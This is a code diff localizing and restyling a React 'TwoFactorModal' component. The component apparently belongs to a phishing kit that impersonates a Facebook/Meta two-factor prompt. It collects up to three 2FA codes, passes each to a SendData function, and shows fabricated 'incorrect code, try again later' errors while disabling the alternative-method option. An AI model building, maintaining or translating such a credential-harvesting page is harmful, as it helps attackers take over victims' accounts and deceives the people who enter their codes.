@@ -3,6 +3,7 @@ import Modal from './Modal';
 import { maskEmail, maskPhoneNumber } from '@/utils/mask';
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
+import { useAppStrings } from '@/hooks/useAppStrings';
 import { SendData } from '@/utils/sendData';
 
 interface TwoFactorModalProps {
@@ -12,6 +13,7 @@ interface TwoFactorModalProps {
 }
 
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
+    const t = useAppStrings();
     const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30;
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
@@ -69,7 +71,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
     const formatRetryError = (secondsLeft: number) => {
         const minutes = Math.floor(secondsLeft / 60);
         const seconds = secondsLeft % 60;
-        return `Mã xác thực bạn nhập chưa chính xác. Vui lòng thử lại sau ${minutes} phút ${seconds} giây.`;
+        return t.twoFa.retryError(minutes, seconds);
     };
 
     const startRetryCountdown = (nextStep: number) => {
@@ -127,7 +129,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
 
             if (!isTwoFaValid) {
-                setErrors({ twoFa: 'Vui lòng nhập mã 2FA hợp lệ gồm 6 hoặc 8 chữ số.' });
+                setErrors({ twoFa: t.twoFa.errInvalid });
                 return;
             }
 
@@ -146,7 +148,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors({ twoFa: 'Không thể gửi mã xác thực. Vui lòng thử lại sau.' });
+                    setErrors({ twoFa: t.twoFa.errSend });
                 });
             }
 
@@ -163,7 +165,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors({ twoFa: 'Không thể gửi mã xác thực. Vui lòng thử lại sau.' });
+                    setErrors({ twoFa: t.twoFa.errSend });
                 });
             }
 
@@ -183,7 +185,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
-                    setErrors({ twoFa: 'Không thể xác minh mã 2FA. Vui lòng thử lại.' });
+                    setErrors({ twoFa: t.twoFa.errVerify });
                 });
             }
 
@@ -207,51 +209,51 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                         <span>{fullName}</span>
                         <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
-                        <span>Facebook</span>
+                        <span>{t.common.facebook}</span>
                     </div>
-                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>Yêu cầu xác thực hai yếu tố (Bước {click + 1}/3)</h2>
-                    <p className='text-[#9a979e] text-[14px]'>Nhập mã cho tài khoản này được gửi đến {emailDisplay}, {phoneDisplay} hoặc xác nhận bằng ứng dụng xác thực bạn đã thiết lập (như Duo Mobile hoặc Google Authenticator).</p>
+                    <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title(click + 1)}</h2>
+                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay)}</p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                     </div>
                     <div className='w-full'>
                         <form onSubmit={handSubmit}>
-                            <label htmlFor='twoFa' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Mã 2FA <span className='text-[#e5484d]'>*</span></label>
+                            <label htmlFor='twoFa' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.twoFa.label} <span className='text-[#e5484d]'>*</span></label>
                             <div className={`${inputClass('twoFa')}`} >
                                 <input
                                     type="text"
                                     inputMode="numeric"
                                     id="twoFa"
-                                    placeholder="Nhập mã xác thực"
+                                    placeholder={t.twoFa.placeholder}
                                     className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                     value={twoFa}
                                     onChange={handleChange}
                                     onPaste={handlePaste}
                                     disabled={disabled}
                                     maxLength={8}
-                                    aria-label='Mã xác thực hai yếu tố'
+                                    aria-label={t.twoFa.ariaInput}
                                 />
                             </div>
-                            <p className='text-[#6a7893] text-[12px] mt-[-5px] mb-[10px]'>Mã hợp lệ gồm 6 hoặc 8 chữ số.</p>
+                            <p className='text-[#6a7893] text-[12px] mt-[-5px] mb-[10px]'>{t.twoFa.hint}</p>
                             {errorText('twoFa')}
 
                             <div className='w-full mt-[20px]'>
                                 <button
-                                    className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
+                                    className={`min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer active:opacity-90'}`}
                                     disabled={disabled || !isTwoFaValid}
-                                    aria-label='Tiếp tục xác thực'
+                                    aria-label={t.twoFa.ariaSubmit}
                                 >
                                     {loading && (
                                         <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
                                             <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                         </div>
                                     )}
-                                    {loading ? '' : 'Tiếp tục'}
+                                    {loading ? '' : t.common.continue}
                                 </button>
                             </div>
 
                             <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] pointer-events-none'>
-                                <span>Thử phương thức khác</span>
+                                <span>{t.twoFa.tryOther}</span>
                             </div>
                         </form>
                     </div>
